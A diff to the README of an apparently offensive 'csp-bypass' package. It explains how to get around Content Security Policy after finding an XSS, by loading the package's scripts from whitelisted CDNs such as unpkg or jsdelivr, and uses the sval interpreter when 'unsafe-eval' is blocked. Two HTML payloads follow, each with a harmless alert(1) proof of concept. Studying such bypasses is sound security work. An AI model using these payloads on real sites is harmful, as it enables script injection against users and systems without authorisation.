@@ -12,5 +12,26 @@ If you are lucky enough to find unsafe-eval in the CSP configuration, you can us
 - Url => /dist/url.js
 
 If you can't use eval() because unsafe-eval is not in the configuration, well it's not over !!
-I made a small interpreter that does not use the eval() function. 
-I'm planning to make it a little more complexe so you can execute almost any javascript code you want !
+I found a Javascript interpreter called [sval](https://github.com/Siubaak/sval).
+It can easily bypass the unsafe-eval restriction :) !
+
+- Classic => /dist/sval-classic.js
+- Classic-infinite => /dist/sval-infinite.js
+- Url => /dist/sval-url.js
+
+## Example
+
+If you have an XSS on a website with CSP, search in the directive 'script-src' for [unpkg.com](https://unpkg.com/) or [jsdeliver](https://www.jsdelivr.com/).
+If these domain are whitelist, you win !
+
+```html
+  <script src="https://unpkg.com/csp-bypass@1.0.2-0/dist/classic.js"></script>
+  <br csp="alert(1)">
+```
+
+if 'unsafe-eval' is missing use the sval one:
+
+```html
+  <script src="https://unpkg.com/csp-bypass@1.0.2-0/dist/sval-classic.js"></script>
+  <br csp="alert(1)">
+```
